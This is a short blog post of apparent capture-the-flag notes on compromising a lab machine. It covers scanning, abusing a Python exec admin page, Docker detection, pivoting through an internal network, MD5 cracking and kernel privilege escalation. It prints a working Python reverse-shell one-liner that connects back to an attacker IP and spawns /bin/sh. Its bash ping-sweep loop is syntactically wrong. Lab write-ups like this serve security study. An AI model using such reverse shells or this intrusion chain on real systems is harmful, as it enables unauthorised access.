---
layout: post
title: Meduim_SocialNetwork
date: 2022-01-20
tag: notes
---
# Learn outcome

*   use python to get shell
*   identify docker container
*   Vemon pivot internal network
*   md5 hash
*   Source code analyse while privilege escalation

## 192.168.1.78

1.  `nmap` python server on 5000
2.  `dirsearch` /admin directory that can run python function `exec`
3.  Use python code to make victim connect to me.

```python
socket=__import__('socket');os=__import__('os');pty=__import__('pty');s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.1.73',3333));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/sh')
```

## 172.10.0.3

1.  `ls /.dockerenv` `cat /proc/1/cgroup` find it's a docker container
2.  `Vemon` admin program on my computer, client program on victim compuer and connect to me.
3.  `Socks5` set proxy using admin program then proxy packet to the internal network
4.  A little coding of bash, use ping to find alive ip

```sh
for $i in (seq 1 10); do ping 172.10.0.$i; done;
```
5.  `nmap` find 172.10.0.2 open a vulerable service

## 172.10.0.2

1.  `searchspoit` find RCE expolit for that service
2.  Find it's another docker
3.  Find a password file, have Name:(MD5 hashed)password
4.  Use online MD5 website crack one of the password
5.  `ssh` into the real host

## 192.168.1.78

1.  `id` normal user, cannot sudo
2.  `uname -a` find linux 3.13
3.  `searchspolit`  find local privilege escalation exploit
4.  CVE code needs gcc, and use gcc inside the code, but no gcc on victim
5.  prepare the executable in the code that use gcc to compile.
6.  send them to victim and execute

## We got a Root



